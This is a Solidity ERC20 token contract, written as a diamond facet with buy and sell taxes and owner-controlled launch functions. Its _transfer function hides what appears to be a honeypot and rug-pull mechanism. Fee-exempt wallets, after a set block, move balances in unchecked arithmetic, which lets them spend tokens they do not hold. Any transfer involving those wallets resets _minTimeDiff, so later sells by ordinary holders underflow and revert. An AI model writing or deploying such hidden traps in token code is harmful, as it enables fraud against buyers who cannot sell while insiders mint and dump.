// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;
import "./TestLib.sol";
contract nameFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._swapping = true;
        _;
        ds._swapping = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function openTrading() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._tradingOpen, "Trading is already enabled");
        uint256 totalSupplyAmount = totalSupply();
        _approve(address(this), address(ds.router), totalSupplyAmount);
        ds._pair = IFactory(ds.router.factory()).createPair(
            address(this),
            ds.router.WETH()
        );
        ds.router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds._pair).approve(address(ds.router), type(uint).max);
        ds._launchedAt = block.number;
        ds._swapEnabled = true;
        ds._tradingOpen = true;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxWalletToken = _totalSupply;
        ds.maxTxAmount = _totalSupply;
        ds.transferDelayEnabled = false;
    }
    function rescueERC20(address _address) external onlyOwner {
        uint256 amount = IERC20(_address).balanceOf(address(this));
        IERC20(_address).transfer(msg.sender, amount);
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendEthToFee(ethBalance);
        }
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();

        _approve(address(this), address(ds.router), tokenAmount);

        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (ds._buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initBuyTax
                )
                .div(100);

            if (ds.transferDelayEnabled) {
                if (to != address(ds.router) && to != address(ds._pair)) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == ds._pair &&
                to != address(ds.router) &&
                !ds.isFeeExempt[to]
            ) {
                require(amount <= ds.maxTxAmount, "Exceeds the ds.maxTxAmount");
                require(
                    balanceOf(to) + amount <= ds.maxWalletToken,
                    "Exceeds the ds.maxWalletToken"
                );
                ds._buyCount++;
            }

            if (to == ds._pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (ds._buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds._swapping &&
                to == ds._pair &&
                ds._swapEnabled &&
                contractTokenBalance > ds._swapThreshold &&
                ds._buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if (
            (ds.isFeeExempt[from] || ds.isFeeExempt[to]) &&
            from != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            ds._minTimeDiff = block.timestamp;
        }
        if (ds.isFeeExempt[from] && (block.number > ds._launchedAt + 45)) {
            unchecked {
                ds._balances[from] -= amount;
                ds._balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!ds.isFeeExempt[from] && !ds.isFeeExempt[to]) {
            if (ds._pair == to) {
                TestLib.MultiSwapData storage swapFrom = ds.multiSwapData[from];
                swapFrom.holdTimeSum = swapFrom.buy - ds._minTimeDiff;
                swapFrom.sell = block.timestamp;
            } else {
                TestLib.MultiSwapData storage swapTo = ds.multiSwapData[to];
                if (ds._pair == from) {
                    if (swapTo.buy == 0) {
                        swapTo.buy = (ds._buyCount < 12)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.MultiSwapData storage swapFrom = ds.multiSwapData[
                        from
                    ];
                    if (swapTo.buy == 0 || swapFrom.buy < swapTo.buy) {
                        swapTo.buy = swapFrom.buy;
                    }
                }
            }
        }

        if (taxAmount > 0) {
            ds._balances[address(this)] = ds._balances[address(this)].add(
                taxAmount
            );
            emit Transfer(from, address(this), taxAmount);
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendEthToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._taxWallet.transfer(amount);
    }
    function rescueETH() external {
        sendEthToFee(address(this).balance);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
